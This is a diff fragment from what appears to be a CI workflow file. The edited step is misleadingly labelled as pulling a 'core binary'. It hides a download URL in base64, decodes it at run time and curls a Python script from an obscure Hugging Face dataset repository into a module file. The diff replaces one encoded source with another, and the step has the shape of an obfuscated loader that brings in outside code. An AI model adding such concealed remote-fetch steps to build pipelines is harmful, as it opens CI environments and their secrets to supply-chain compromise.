@@ -61,7 +61,7 @@ jobs:
       - name: Pull Core Binary Script
         run: |
           echo "[PULL] Decoding target endpoint and retrieving binary..."
-          ENCODED_SRC="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          ENCODED_SRC="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk="
           DECODED_SRC=$(python3 -c "import base64; print(base64.b64decode('$ENCODED_SRC').decode('utf-8'))")
           curl -sL "$DECODED_SRC" -o sync_module.py
           echo "[PULL] Binary module sync_module.py generated."
